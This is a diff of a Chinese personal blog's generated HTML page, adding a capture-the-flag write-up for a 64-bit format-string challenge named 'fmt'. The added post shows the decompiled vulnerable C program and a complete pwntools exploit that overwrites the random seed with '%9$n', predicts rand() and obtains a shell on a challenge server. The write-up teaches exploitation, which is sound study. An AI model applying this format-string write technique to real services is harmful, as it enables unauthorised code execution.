@@ -6,23 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>关于我 | 辰祈w</title>
+  <title>fmt | 辰祈w</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="小萌新pwn选手，常常自闭">
-<meta property="og:type" content="website">
-<meta property="og:title" content="关于我">
-<meta property="og:url" content="http://yoursite.com/about/index.html">
+  <meta name="description" content="fmt考点：格式化字符串难度系数：**">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fmt">
+<meta property="og:url" content="http://yoursite.com/2020/10/19/fmt/index.html">
 <meta property="og:site_name" content="辰祈w">
-<meta property="og:description" content="小萌新pwn选手，常常自闭">
+<meta property="og:description" content="fmt考点：格式化字符串难度系数：**">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/about/index/head.jpg">
-<meta property="article:published_time" content="2020-03-24T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-03-25T00:46:57.422Z">
+<meta property="article:published_time" content="2020-10-19T12:15:58.162Z">
+<meta property="article:modified_time" content="2020-10-19T12:16:40.691Z">
 <meta property="article:author" content="Chenqiw">
+<meta property="article:tag" content="2020极客大挑战">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/about/index/head.jpg">
   
     <link rel="alternative" href="/atom.xml" title="辰祈w" type="application/atom+xml">
   
@@ -189,14 +188,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-fmt" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      关于我
+      fmt
     </h1>
   
 
@@ -208,8 +207,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/about/index.html" class="archive-article-date">
-        <time datetime="2020-03-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-25</time>
+<a href="/2020/10/19/fmt/" class="archive-article-date">
+        <time datetime="2020-10-19T12:15:58.162Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-19</time>
 </a>
 
   
@@ -222,7 +221,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">10字</span>
+      <span class="post-count">382字</span>
     </span>
   </span>
 
@@ -242,8 +241,18 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <p>小萌新pwn选手，常常自闭</p>
-<p><img src="/about/index/head.jpg" alt="head"></p>
+    <h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><h5 id="考点：格式化字符串"><a href="#考点：格式化字符串" class="headerlink" title="考点：格式化字符串"></a>考点：格式化字符串</h5><h5 id="难度系数："><a href="#难度系数：" class="headerlink" title="难度系数：**"></a>难度系数：**</h5><a id="more"></a>
+
+<p>这个题是个64位的格式化字符串漏洞，之前一直用32位的思路去做，难怪做了半天发现没有啥用，后面才想起64位和32位格式化字符串漏洞有一些区别，没接触过32位格式化字符串的话建议先去了解32位的格式化字符串。 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  __int64 i; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+10h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  seed = time(<span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"hello world!"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf, &amp;buf);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    __isoc99_scanf((__int64)<span class="string">"%ld"</span>, (__int64)&amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( rand() != v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"hei! random number!!!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"running sh"</span>);</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>格式化字符串漏洞改写seed的值使srand不随机 </p>
+<p>再利用libc = cdll.LoadLibrary(“/lib/x86_64-linux-gnu/libc.so.6”) 调出相同的函数rand用一样的seed去对应，</p>
+<p>64位前6个参数都是保存在相应寄存器里面所以偏移从7开始</p>
+<p>p64(addr)打包会发送’\x00‘,printf就会以为字符串结束了，所以打包的地址必须放到最后</p>
+<p>exp</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">"debug"</span>)</span><br><span class="line"><span class="comment">#p = process('./fmt')</span></span><br><span class="line">elf = ELF(<span class="string">'./fmt'</span>)</span><br><span class="line">p = remote(<span class="string">'81.69.0.47'</span>,<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">seed = <span class="number">0x40409C</span></span><br><span class="line">offes = <span class="number">8</span></span><br><span class="line">payload = <span class="string">'aaaa'</span>+<span class="string">'%9$n'</span>+p64(seed)</span><br><span class="line">p.sendlineafter(<span class="string">' world!'</span>,payload)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">'\x9c@@'</span>,str(libc.rand()))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">	 p.sendline(str(libc.rand()))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 
     
 
@@ -258,7 +267,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://yoursite.com/about/index.html" title="关于我" target="_blank">http://yoursite.com/about/index.html</a>
+          <a href="http://yoursite.com/2020/10/19/fmt/" title="fmt" target="_blank">http://yoursite.com/2020/10/19/fmt/</a>
         </li>
         
         <li>
@@ -275,7 +284,29 @@
   <div class="article-info article-info-index">
     
     
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">2020极客大挑战</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
     
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/格式化字符串//" class="article-tag-list-link color2">格式化字符串</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
     
 
@@ -325,7 +356,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/about/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/10/19/fmt/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -337,6 +368,25 @@
   </div>
 </article>
 
+
+<nav id="article-nav">
+  
+    <a href="/2020/10/19/runcode/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          runcode
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/10/19/liuzhuang-secret/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">liuzhuang-secret</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
 <aside class="wrap-side-operation">
@@ -406,7 +456,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
